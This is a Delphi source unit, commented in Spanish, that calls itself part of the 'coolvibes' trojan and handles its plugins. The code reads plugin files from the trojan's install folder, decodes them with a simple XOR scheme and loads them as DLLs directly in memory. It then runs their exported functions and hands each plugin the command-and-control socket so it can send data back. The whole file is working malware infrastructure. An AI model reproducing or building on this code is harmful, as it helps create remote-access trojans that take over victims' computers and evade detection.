{Unit perteniciente al troyano coolvibes que se encarga de los plugins}
unit UnitPlugins;

interface

uses Windows, SysUtils, Socketunit, UnitVariables, classes, BTMemoryModule;

type
  TPlugin = record
    Nombre       : string;
    id           : integer;
    Recdata      : procedure(data:string);stdcall;
    Stop         : procedure();stdcall;
    StopDef      : boolean;
    Module       : PBTMemoryModule;
    Content      : string;
  end;

  type
  TPluginThread = class(TThread)
  public
    PluginFilen : string;
    constructor Create(pPluginFile:string);
  protected
    procedure Execute; override;
  end;
  
var
  Plugins : array[0..100] of TPlugin;
  PluginCount : integer;

function cargarplugin(i:integer;socket:Tclientsocket):boolean;
procedure CargarPluginsDeInicio();
implementation


constructor TPluginThread.Create(pPluginFile:string);
begin
  inherited Create(True);
  PluginFilen := pPluginFile;
end;

procedure TPluginThread.Execute();
var
  Tmp : string;
  PluginFile : file;
  tamano : integer;
  a : integer;
  CargaOffline : procedure();stdcall;
  Module       : PBTMemoryModule;
  p : pointer;
begin
  FileMode := 0;
  AssignFile(PluginFile, PluginFilen);
  Reset(PluginFile, 1);
  tamano := FileSize(PluginFile);
  SetLength(Tmp, tamano);
  BlockRead(PluginFile, tmp[1], tamano);
  CloseFile(PluginFile);

  for a := 1 to Length(Tmp) do //Lo desciframos
    Tmp[a] := chr(Ord(Tmp[a]) xor a);
  p := @tmp[1];
  Module := BTMemoryLoadLibary(p, length(tmp));

  if Module <> nil then
  begin
    @CargaOffline := BTMemoryGetProcAddress(Module , 'CargaOffline');
    if @CargaOffline <> nil then
      CargaOffline();
  end;

  ExitThread(0);
end;

function CargarPlugin(i:integer;socket:Tclientsocket):boolean;
var
  Tmp : string;
  PluginFile : file;
  tamano : integer;
  a : integer;
  rd,p : pointer;
  Start : procedure(id:integer;nombre:string);stdcall;
begin
  Result := false;
  if fileexists(extractfilepath(paramstr(0))+Plugins[i].Nombre+'.cp') then    //Opcion de guardar al disco
  begin
    FileMode := 0;
    AssignFile(PluginFile, extractfilepath(paramstr(0))+Plugins[i].Nombre+'.cp');
    Reset(PluginFile, 1);
    tamano := FileSize(PluginFile);
    SetLength(Tmp, tamano);
    BlockRead(PluginFile, tmp[1], tamano);
    CloseFile(PluginFile);
  end
  else if Plugins[i].Content <> '' then //No guardar al disco
  begin
    Tmp := Plugins[i].Content;
  end;
  
  for a := 1 to Length(Tmp) do //Lo desciframos
    Tmp[a] := chr(Ord(Tmp[a]) xor a);
    
  p := @tmp[1];  
  Plugins[i].Module := BTMemoryLoadLibary(p, length(tmp));

  if Plugins[i].Module <> nil then
  begin
    rd := BTMemoryGetProcAddress(Plugins[i].Module , 'RecData');
    if rd <> nil then
    begin
      Plugins[i].Stop := BTMemoryGetProcAddress(Plugins[i].Module , 'Stop');
      Plugins[i].StopDef := true;
      Plugins[i].Recdata := rd;
      @Start := BTMemoryGetProcAddress(Plugins[i].Module , 'Start');
      Start(socket.Socket, Plugins[i].Nombre); //Le damos el handle para que pueda mandar info
      Result := true;
    end;
  end;
end;

procedure CargarPluginsDeInicio();
var
   ThreadPlug: TPluginThread;
   Listado: TSearchRec;
begin

  
  SetErrorMode(SEM_FAILCRITICALERRORS);
  if FindFirst(extractfilepath(Configuracion.sCopyTo) + '*.cp', faAnyFile, Listado) = 0 then
    begin
      repeat
        if not ((Listado.Attr and faDirectory) = faDirectory) then
        begin
          
          ThreadPlug := TPluginThread.Create(Extractfilepath(Configuracion.sCopyTo)+Listado.name); //Se crea nuevo thread
          ThreadPlug.Resume;
        end;
        until FindNext(Listado) <> 0;
      SysUtils.FindClose(Listado);
    end;
end;
end.
